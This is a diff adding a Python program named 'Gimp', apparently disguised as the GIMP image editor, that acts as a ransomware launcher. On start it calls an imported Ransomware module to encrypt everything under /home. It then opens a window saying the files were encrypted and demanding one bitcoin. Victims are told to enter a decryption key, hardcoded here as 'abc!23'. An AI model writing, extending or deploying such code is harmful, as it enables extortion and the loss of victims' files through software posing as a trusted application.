@@ -1,0 +1,64 @@
+import customtkinter as ctk
+import os
+from ransomware import Ransomware
+
+class Gimp:
+    def __init__(self):
+        ctk.set_appearance_mode("dark")
+        ctk.set_default_color_theme("dark-blue")
+        self.ransomware = Ransomware()
+        self.window = ctk.CTk()
+        self.label6 = None
+
+    def encrypt(self) -> None:
+        if os.path.exists(".encrypt_key"):
+            print("files already encrypted")
+            return
+        self.ransomware.encrypt_files("/home")
+        print("encrypted files")
+
+    def decrypt(self) -> None:
+        self.ransomware.decrypt_files("/home")
+        print("decrypted files")
+
+    def check_key(self) -> None:
+        key_entered = self.key_textbox.get()
+        if self.label6:
+            self.label6.destroy()
+
+        if key_entered == "abc!23":
+            self.decrypt()
+            self.label6 = ctk.CTkLabel(self.window, text="Files decrypted!", anchor="center", font=self.font)
+        else:
+            self.label6 = ctk.CTkLabel(self.window, text="Wrong key!", anchor="center", font=self.font)
+        self.label6.pack()
+
+    def create_widgets(self) -> None:
+        self.font = ctk.CTkFont(family="Arial", size=18)
+        label1 = ctk.CTkLabel(self.window, text="You have been hacked and we encrypted all your user files!", anchor="center", font=self.font)
+        label1.pack(pady=2)
+        label2 = ctk.CTkLabel(self.window, text="To recover your files you have to pay us 1 bitcoin!", anchor="center", font=self.font)
+        label2.pack(pady=2)
+        label3 = ctk.CTkLabel(self.window, text="Send us email with your ip and we will tell you where to pay", anchor="center", font=self.font)
+        label3.pack(pady=2)
+        label4 = ctk.CTkLabel(self.window, text="After payment you will get decryption key!", anchor="center", font=self.font)
+        label4.pack(pady=2)
+        label5 = ctk.CTkLabel(self.window, text="Enter your decryption key here to unlock all your files:", anchor="center", font=self.font)
+        label5.pack(pady=20)
+
+        self.key_textbox = ctk.CTkEntry(self.window, placeholder_text="Enter your key here!")
+        self.key_textbox.pack()
+        send_button = ctk.CTkButton(self.window, text="Decrypt!", command=self.check_key)
+        send_button.pack()
+
+
+    def run(self) -> None:
+        self.encrypt()
+        self.window.title("Gimp")
+        self.window.geometry("600x450")
+        self.create_widgets()
+        self.window.mainloop()
+
+if __name__ == '__main__':
+    gimp = Gimp()
+    gimp.run()
